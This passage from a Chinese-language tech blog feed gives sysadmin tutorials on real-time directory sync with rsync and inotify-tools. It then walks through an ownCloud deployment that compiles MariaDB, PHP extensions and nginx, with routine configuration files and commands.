-p tcp -m state --state NEW  -m tcp --dport 873 -j ACCEPT</span><br><span class="line"># iptables -L  查看一下防火墙是不是打开了 873端口</span><br><span class="line"># netstat -anp|grep 873</span><br></pre></td></tr></table></figure><p>建议关闭<code>selinux</code>，可能会由于强访问控制导致同步报错</p><h3 id="客户端测试同步"><a href="#客户端测试同步" class="headerlink" title="客户端测试同步"></a>客户端测试同步</h3><p>单向同步时，客户端只需要一个包含密码的文件。<br><strong>/etc/rsync_client.pwd：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passw0rd</span><br></pre></td></tr></table></figure><p>chmod 600 /etc/rsync_client.pwd</p><p><strong>命令：</strong><br>将本地<code>/root/</code>目录同步到远程192.168.1.1的/tmp/rsync_bak2目录（module_test指定）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/rsync -auvrtzopgP --progress --password-file=/etc/rsync_client.pwd /root/ sean@192.168.1.1::file</span><br></pre></td></tr></table></figure><p>当然你也可以将远程的/tmp/rsync_bak2目录同步到本地目录/root/tmp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/rsync -auvrtzopgP --progress --password-file=/etc/rsync_client.pwd sean@192.168.1.1::filet /root/</span><br></pre></td></tr></table></figure><p>从上面两个命令可以看到，其实这里的服务器与客户端的概念是很模糊的，rsync daemon都运行在远程172.29.88.223上，第一条命令是本地主动推送目录到远程，远程服务器是用来备份的；第二条命令是本地主动向远程索取文件，本地服务器用来备份，也可以认为是本地服务器恢复的一个过程。</p><h1 id="inotify-tools"><a href="#inotify-tools" class="headerlink" title="inotify-tools"></a>inotify-tools</h1><h2 id="什么是inotify"><a href="#什么是inotify" class="headerlink" title="什么是inotify"></a>什么是inotify</h2><p>inotify是一种强大的、细粒度的、异步的文件系统事件监控机制，Linux内核从2.6.13开始引入，允许监控程序打开一个独立文件描述符，并针对事件集监控一个或者多个文件，例如打开、关闭、移动/重命名、删除、创建或者改变属性。</p><p>CentOS6自然已经支持：<br>使用<code>ll /proc/sys/fs/inotify</code>命令，是否有以下三条信息输出，如果没有表示不支持。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total 0</span><br><span class="line">-rw-r--r-- 1 root root 0 Dec 11 15:23 max_queued_events</span><br><span class="line">-rw-r--r-- 1 root root 0 Dec 11 15:23 max_user_instances</span><br><span class="line">-rw-r--r-- 1 root root 0 Dec 11 15:23 max_user_watches</span><br></pre></td></tr></table></figure><ul><li><code>/proc/sys/fs/inotify/max_queued_evnets</code>表示调用inotify_init时分配给inotify instance中可排队的event的数目的最大值，超出这个值的事件被丢弃，但会触发IN_Q_OVERFLOW事件。</li><li><code>/proc/sys/fs/inotify/max_user_instances</code>表示每一个real user ID可创建的inotify instatnces的数量上限。</li><li><code>/proc/sys/fs/inotify/max_user_watches</code>表示每个inotify instatnces可监控的最大目录数量。如果监控的文件数目巨大，需要根据情况，适当增加此值的大小。</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>inotify-tools：</strong></p><p>inotify-tools是为linux下inotify文件监控工具提供的一套C的开发接口库函数，同时还提供了一系列的命令行工具，这些工具可以用来监控文件系统的事件。 inotify-tools是用c编写的，除了要求内核支持inotify外，不依赖于其他。inotify-tools提供两种工具，一是<code>inotifywait</code>，它是用来监控文件或目录的变化，二是<code>inotifywatch</code>，它是用来统计文件系统访问的次数。</p><p>下载inotify-tools-3.14-1.el6.x86_64.rpm，通过rpm包安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rpm -ivh inotify-tools-3.14-1.el6.x86_64.rpm</span><br></pre></td></tr></table></figure><h2 id="inotifywait使用示例"><a href="#inotifywait使用示例" class="headerlink" title="inotifywait使用示例"></a>inotifywait使用示例</h2><p>监控/root/tmp目录文件的变化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/inotifywait -mrq --timefmt &apos;%Y/%m/%d-%H:%M:%S&apos; --format &apos;%T %w %f&apos; \</span><br><span class="line"> -e modify,delete,create,move,attrib /root/tmp/</span><br></pre></td></tr></table></figure><p>上面的命令表示，持续监听<code>/root/tmp</code>目录及其子目录的文件变化，监听事件包括文件被修改、删除、创建、移动、属性更改，显示到屏幕。执行完上面的命令后，在<code>/root/tmp</code>下创建或修改文件都会有信息输出：</p><h2 id="创建排除在外不同步的文件列表"><a href="#创建排除在外不同步的文件列表" class="headerlink" title="创建排除在外不同步的文件列表"></a>创建排除在外不同步的文件列表</h2><p>排除不需要同步的文件或目录有两种做法，第一种是inotify监控整个目录，在rsync中加入排除选项，简单；第二种是inotify排除部分不监控的目录，同时rsync中也要加入排除选项，可以减少不必要的网络带宽和CPU消耗。我们选择第二种。</p><h3 id="inotifywait排除"><a href="#inotifywait排除" class="headerlink" title="inotifywait排除"></a>inotifywait排除</h3><p>这个操作在客户端进行，假设<code>/tmp/src/mail/2014/</code>以及<code>/tmp/src/mail/2015/cache/</code>目录下的所有文件不用同步，所以不需要监控，<code>/tmp/src/</code>下的其他文件和目录都同步。（其实对于打开的临时文件，可以不监听<code>modify</code>时间而改成监听<code>close_write</code>）</p><p>inotifywait排除监控目录有<code>--exclude &lt;pattern&gt;</code>和<code>--fromfile &lt;file&gt;</code>两种格式，并且可以同时使用，但主要前者可以用正则，而后者只能是具体的目录或文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/inotify_exclude.lst：</span><br><span class="line">/tmp/src/pdf</span><br><span class="line">@/tmp/src/2014</span><br></pre></td></tr></table></figure><p>使用<code>fromfile</code>格式只能用绝对路径，不能使用诸如<code>*</code>正则表达式去匹配，<code>@</code>表示排除。</p><p>如果要排除的格式比较复杂，必须使用正则，那只能在<code>inotifywait</code>中加入选项，如<code>--exclude &#39;(.*/*\.log|.*/*\.swp)$|^/tmp/src/mail/(2014|201.*/cache.*)&#39;</code>，表示排除/tmp/src/mail/以下的2014目录，和所有201*目录下的带cache的文件或目录，以及/tmp/src目录下所有的以.log或.swp结尾的文件。</p><h3 id="rsync排除"><a href="#rsync排除" class="headerlink" title="rsync排除"></a>rsync排除</h3><p>使用inotifywait排除监控目录的情况下，必须同时使用rsync排除对应的目录，否则只要有触发同步操作，必然会导致不该同步的目录也会同步。与inotifywait类似，rsync的同步也有<code>--exclude</code>和<code>--exclude-from</code>两种写法。</p><p>个人还是习惯将要排除同步的目录卸载单独的文件列表里，便于管理。使用<code>--include-from=FILE</code>时，排除文件列表用绝对路径，但FILE里面的内容请用相对路径，如：<br><code>/etc/rsyncd.d/rsync_exclude.lst</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mail??*</span><br><span class="line">src/*.html*</span><br><span class="line">src/js/</span><br><span class="line">src/ext3/</span><br><span class="line">src/2014/20140[1-9]/</span><br><span class="line">src/201*/201*/201*/.??*</span><br><span class="line">membermail/</span><br><span class="line">membermail??*</span><br><span class="line">membermail/201*/201*/201*/.??*</span><br></pre></td></tr></table></figure><h2 id="客户端同步到远程的脚本rsync-sh"><a href="#客户端同步到远程的脚本rsync-sh" class="headerlink" title="客户端同步到远程的脚本rsync.sh"></a>客户端同步到远程的脚本<code>rsync.sh</code></h2><p>下面是一个完整的同步脚本，请根据需要进行裁剪，<code>rsync.sh</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#variables</span><br><span class="line">current_date=$(date +%Y%m%d_%H%M%S)</span><br><span class="line">source_path=/tmp/src/</span><br><span class="line">log_file=/var/log/rsync_client.log</span><br><span class="line"></span><br><span class="line">#rsync</span><br><span class="line">rsync_server=192.168.1.1</span><br><span class="line">rsync_user=sean</span><br><span class="line">rsync_pwd=/etc/rsync_client.pwd</span><br><span class="line">rsync_module=file</span><br><span class="line">INOTIFY_EXCLUDE=&apos;(.*/*\.log|.*/*\.swp)$|^/tmp/src/mail/(2014|20.*/.*che.*)&apos;</span><br><span class="line">RSYNC_EXCLUDE=&apos;/etc/rsyncd.d/rsync_exclude.lst&apos;</span><br><span class="line"></span><br><span class="line">#rsync client pwd check</span><br><span class="line">if [ ! -e $&#123;rsync_pwd&#125; ];then</span><br><span class="line">    echo -e &quot;rsync client passwod file $&#123;rsync_pwd&#125; does not exist!&quot;</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">#inotify_function</span><br><span class="line">inotify_fun()&#123;</span><br><span class="line">    /usr/bin/inotifywait -mrq --timefmt &apos;%Y/%m/%d-%H:%M:%S&apos; --format &apos;%T %w %f&apos; \</span><br><span class="line">          --exclude $&#123;INOTIFY_EXCLUDE&#125;  -e modify,delete,create,move,attrib $&#123;source_path&#125; \</span><br><span class="line">          | while read file</span><br><span class="line">      do</span><br><span class="line">          /usr/bin/rsync -auvrtzopgP --exclude-from=$&#123;RSYNC_EXCLUDE&#125; --progress --bwlimit=1000 --password-file=$&#123;rsync_pwd&#125; $&#123;source_path&#125; $&#123;rsync_user&#125;@$&#123;rsync_server&#125;::$&#123;rsync_module&#125; </span><br><span class="line">      done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#inotify log</span><br><span class="line">inotify_fun &gt;&gt; $&#123;log_file&#125; 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p><code>--bwlimit=1000</code>用于限制传输速率最大1000kb，因为在实际应用中发现如果不做速率限制，会导致巨大的CPU消耗。</p><p>在客户端运行脚本<code># ./rsync.sh</code>即可实时同步目录.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="rsync" scheme="https://fenghong.tech/tags/rsync/"/>
    
      <category term="inotify" scheme="https://fenghong.tech/tags/inotify/"/>
    
  </entry>
  
  <entry>
    <title>owncloud私有云搭建</title>
    <link href="https://fenghong.tech/owncloud_deploy.html"/>
    <id>https://fenghong.tech/owncloud_deploy.html</id>
    <published>2018-10-20T08:03:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="owncloud的功能"><a href="#owncloud的功能" class="headerlink" title="owncloud的功能"></a>owncloud的功能</h1><ul><li>存储：图片，文档，视频，通讯录以及其他等等</li><li>客户端支持：Android，IOS,MaxOS,Windows,Web,Linux</li><li>分享：可以直接共享<strong>直接链接</strong>给授权过的同事</li><li>在线看视频，文档，音乐。</li><li>可以自行修改功能（作为开发者）</li></ul><h1 id="系统安装环境"><a href="#系统安装环境" class="headerlink" title="系统安装环境"></a><strong>系统安装环境</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CPU model            : Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz</span><br><span class="line">Number of cores      : 2</span><br><span class="line">CPU frequency        : 2500.028 MHz</span><br><span class="line">Total amount of ram  : 16042 MB</span><br><span class="line">Total amount of swap : 4096 MB</span><br><span class="line">System uptime        : 0days, 0:7:13</span><br><span class="line">Load average         : 0.00, 0.08, 0.06</span><br><span class="line">OS                   : CentOS 7.5.1804</span><br><span class="line">Arch                 : x86_64 (64 Bit)</span><br><span class="line">Kernel               : 3.10.0-862.14.4.el7.x86_64</span><br><span class="line">Hostname             : **********</span><br><span class="line">IPv4 address         : **********</span><br></pre></td></tr></table></figure><p><strong>安装预览</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nginx: nginx-1.15.5</span><br><span class="line">nginx Location: /usr/local/nginx   /etc/nginx/</span><br><span class="line"></span><br><span class="line">MariaDB: mariadb-10.2.18</span><br><span class="line">MariaDB Location: /usr/local/mariadb</span><br><span class="line">MariaDB Data Location: /data/mysql</span><br><span class="line">MariaDB Root Password: *************</span><br><span class="line"></span><br><span class="line">PHP: php-7.2.11</span><br><span class="line">PHP Location: /usr/local/php</span><br><span class="line">PHP Additional Modules:</span><br><span class="line">redis.io</span><br><span class="line">intl.so</span><br></pre></td></tr></table></figure><h1 id="mysql二进制安装"><a href="#mysql二进制安装" class="headerlink" title="mysql二进制安装"></a>mysql二进制安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://mirrors.aliyun.com/mariadb//mariadb-10.2.18/bintar-linux-glibc_214-x86_64/mariadb-10.2.18-linux-glibc_214-x86_64.tar.gz</span><br><span class="line">$ tar xf mariadb-10.2.18-linux-glibc_214-x86_64.tar.gz -C /usrlocal/</span><br><span class="line">$ mv  /usr/local/mariadb-10.2.15-linux-x86_64 /usr/local/mariadb</span><br><span class="line">$ chown -R mysql:mysql /usr/local/mariadb  /data/mysql</span><br><span class="line">$ /usr/local/mariadb/scripts/mysql_install_db --basedir=/usr/local/mariadb&#125; --datadir=/data/mysql --user=mysql</span><br><span class="line">$ vim /etc/my.conf</span><br><span class="line">[mysql]</span><br><span class="line"></span><br><span class="line"># CLIENT #</span><br><span class="line">port                           = 3306</span><br><span class="line">socket                         = /tmp/mysql.sock</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line"># GENERAL #</span><br><span class="line">port                           = 3306</span><br><span class="line">user                           = mysql</span><br><span class="line">default-storage-engine         = InnoDB</span><br><span class="line">socket                         = /tmp/mysql.sock</span><br><span class="line">pid-file                       = /data/mysql/mysql.pid</span><br><span class="line">skip-name-resolve</span><br><span class="line">skip-external-locking</span><br><span class="line"></span><br><span class="line"># INNODB #</span><br><span class="line">innodb-log-files-in-group      = 2</span><br><span class="line">innodb-log-file-size           = 256M</span><br><span class="line">innodb-flush-log-at-trx-commit = 2</span><br><span class="line">innodb-file-per-table          = 1</span><br><span class="line">innodb-buffer-pool-size        = 2G</span><br><span class="line"></span><br><span class="line"># CACHES AND LIMITS #</span><br><span class="line">tmp-table-size                 = 32M</span><br><span class="line">max-heap-table-size            = 32M</span><br><span class="line">max-connections                = 4000</span><br><span class="line">thread-cache-size              = 50</span><br><span class="line">open-files-limit               = 4096</span><br><span class="line">table-open-cache               = 1600</span><br><span class="line"></span><br><span class="line"># SAFETY #</span><br><span class="line">max-allowed-packet             = 16M</span><br><span class="line">max-connect-errors             = 1000000</span><br><span class="line"></span><br><span class="line"># DATA STORAGE #</span><br><span class="line">datadir                        = /data/mysql</span><br><span class="line"></span><br><span class="line"># LOGGING #</span><br><span class="line">log-error                      = /data/mysql/mysql-error.log</span><br><span class="line">log-bin               = /data/mysql/mysql-bin</span><br><span class="line">max_binlog_size       = 1073741824</span><br><span class="line">binlog-format           = row</span><br><span class="line"></span><br><span class="line">文件软连接及启动脚本</span><br><span class="line">$ ln -s /usr/local/mariadb/bin/mysql /usr/bin/mysql</span><br><span class="line">$ ln -s /usr/local/mariadb/bin/mysqldump /usr/bin/mysqldump</span><br><span class="line">$ ln -s /usr/local/mariadb/bin/mysqladmin /usr/bin/mysqladmin</span><br><span class="line">$ cp -f /usr/local/mariadb/support-files/mysql.server /etc/init.d/mysqld</span><br><span class="line">$ sed -i &quot;s:^basedir=.*:basedir=/usr/local/mariadb:g&quot; /etc/init.d/mysqld</span><br><span class="line">$ sed -i &quot;s:^datadir=.*:datadir=/data/mysql:g&quot; /etc/init.d/mysqld</span><br></pre></td></tr></table></figure><p>创建owncloud用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ /etc/init.d/mysqld start</span><br><span class="line">$ mysql -u root -p</span><br><span class="line">MariaDB [(none)] &gt; create database owncloud;</span><br><span class="line">MariaDB [(none)] &gt; GRANT ALL ON owncloud.* TO ocuser@localhost IDENTIFIED BY &apos;owncloud&apos;;</span><br><span class="line">MariaDB [(none)] &gt; flush privileges;</span><br><span class="line">MariaDB [(none)] &gt; exit</span><br></pre></td></tr></table></figure><h1 id="PHP编译安装"><a href="#PHP编译安装" class="headerlink" title="PHP编译安装"></a>PHP编译安装</h1><ol><li>编译安装libconv</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.15.tar.gz</span><br><span class="line">$ tar -zxvf libiconv-1.15.tar.gz</span><br><span class="line">$ cd libiconv-1.15</span><br><span class="line">$ ./configure --prefix=/usr/local/libiconv</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line">$ libtool --finish /usr/local/libiconv/lib</span><br></pre></td></tr></table></figure><ol start="2"><li>编译安装php7.2.11</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ yum -y install wget vim pcre pcre-devel openssl openssl-devel libicu-devel gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel ncurses ncurses-devel curl curl-devel krb5-devel libidn libidn-devel openldap openldap-devel nss_ldap jemalloc-devel cmake boost-devel bison automake libevent libevent-devel gd gd-devel libtool* libmcrypt libmcrypt-devel mcrypt mhash libxslt libxslt-devel readline readline-devel gmp gmp-devel libcurl libcurl-devel openjpeg-devel</span><br><span class="line">$ wget http://101.96.10.64/cn2.php.net/distributions/php-7.2.11.tar.gz</span><br><span class="line">$ tar xf  php-7.2.11.tar.gz &amp;&amp; cd php-7.2.11</span><br><span class="line">$ ./configure --prefix=/usr/local/php --with-config-file-path=/etc --enable-fpm --with-fpm-user=nginx --with-fpm-group=nginx --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-soap --with-libxml-dir --with-xmlrpc --with-openssl --with-mhash --with-pcre-regex --with-sqlite3 --with-zlib --enable-bcmath --with-iconv=/usr/local/libiconv --with-bz2 --enable-calendar --with-curl --with-cdb --enable-dom --enable-exif --enable-fileinfo --enable-filter --with-pcre-dir --enable-ftp --with-gd --with-openssl-dir --with-jpeg-dir --with-png-dir --with-zlib-dir --with-freetype-dir --enable-gd-jis-conv --with-gettext --with-gmp --with-mhash --enable-json --enable-mbstring --enable-mbregex --enable-mbregex-backtrack --with-libmbfl --with-onig --enable-pdo --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-zlib-dir --with-pdo-sqlite --with-readline --enable-session --enable-shmop --enable-simplexml --enable-sockets --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-libxml-dir --with-xsl --enable-zip --enable-mysqlnd-compression-support --with-pear --enable-opcache</span><br><span class="line">$ make -j 2 &amp;&amp; make install   #2核编译。</span><br><span class="line">$ cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf</span><br><span class="line">$ cp /usr/local/php/etc/php-fpm.d/www.conf.default /usr/local/php/etc/php-fpm.d/www.conf</span><br><span class="line">$ cp php.ini-production /usr/local/php/etc/php.ini</span><br><span class="line">$ cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm</span><br><span class="line">$ /etc/init.d/php-fpm start</span><br></pre></td></tr></table></figure><ol start="3"><li>编译安装redis.io，intl.io</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#redis.io</span><br><span class="line">$ wget http://pecl.php.net/get/redis-4.0.2.tgz</span><br><span class="line">$ tar xf redis-4.0.2.tgz </span><br><span class="line">$ cd redis-4.0.2</span><br><span class="line">$ find / -name php-config</span><br><span class="line">$ ./configure --with-php-config=/usr/local/php/bin/php-config</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ vim /usr/local/php/etc/php.ini</span><br><span class="line">extentions=redis.io</span><br><span class="line">extension = &quot;redis.so&quot;</span><br><span class="line"></span><br><span class="line">#icu编译安装</span><br><span class="line">$ mkdir /usr/local/icu</span><br><span class="line">$ wget http://download.icu-project.org/files/icu4c/52.1/icu4c-52_1-src.tgz</span><br><span class="line">$ tar xf icu4c-52_1-src.tgz</span><br><span class="line">$ cd icu</span><br><span class="line">$ ls</span><br><span class="line">$ cd source/</span><br><span class="line">$ ./configure --prefix=/usr/local/icu</span><br><span class="line">$ make -j 2 &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">#intl安装</span><br><span class="line">$ cd /data/downloads/php-7.2.11/ext/intl</span><br><span class="line">$ phpize </span><br><span class="line">$ ./configure  --enable-intl --with-icu-dir=/usr/local/icu/ --with-php-config=/usr/local/php/bin/php-config</span><br><span class="line">$ make -j 2 &amp;&amp; make install</span><br><span class="line">$ cd /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/</span><br><span class="line">$ vim /usr/local/php/etc/php.ini</span><br><span class="line">extension = &quot;intl.so&quot;</span><br></pre></td></tr></table></figure><h1 id="nginx-编译安装及配置"><a href="#nginx-编译安装及配置" class="headerlink" title="nginx 编译安装及配置"></a>nginx 编译安装及配置</h1><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf nginx-1.15.5.tar.gz </span><br><span class="line">$ cd nginx-1.15.5</span><br><span class="line">$ ./configure  --prefix=/usr/local/nginx --conf-path=/etc/nginx/nginx.conf --user=nginx --group=nginx</span><br><span class="line">$ useradd -s /sbin/nologin -g nginx -r nginx</span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="主配置配置文件编写"><a href="#主配置配置文件编写" class="headerlink" title="主配置配置文件编写"></a>主配置配置文件编写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/nginx.conf</span><br><span class="line">#user  nobody;</span><br><span class="line">worker_processes  8;</span><br><span class="line"></span><br><span class="line">error_log  /var/log/nginx/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs/nginx.pid;</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    includemime.types;</span><br><span class="line">    server_tokens off;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    fastcgi_connect_timeout 300;</span><br><span class="line">    fastcgi_send_timeout 300;</span><br><span class="line">    fastcgi_read_timeout 300;</span><br><span class="line">    client_max_body_size 4m;</span><br><span class="line">    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">    access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_min_length 10k;</span><br><span class="line">    gzip_buffers 4 48k;</span><br><span class="line">    gzip_http_version 1.0;</span><br><span class="line">    gzip_comp_level 6;</span><br><span class="line">    gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;</span><br><span class="line">    gzip_vary off;</span><br><span class="line">    gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序目录**</p><ul><li>MariaDB 安装目录: /usr/local/mariadb</li><li>MariaDB 数据库目录：/data/mysql（默认，安装时可更改路径）</li><li>PHP 安装目录: /usr/local/php</li><li>Nginx 安装目录： /usr/local/nginx</li></ul><p><strong>命令一览</strong></p><ul><li>MySQL 或 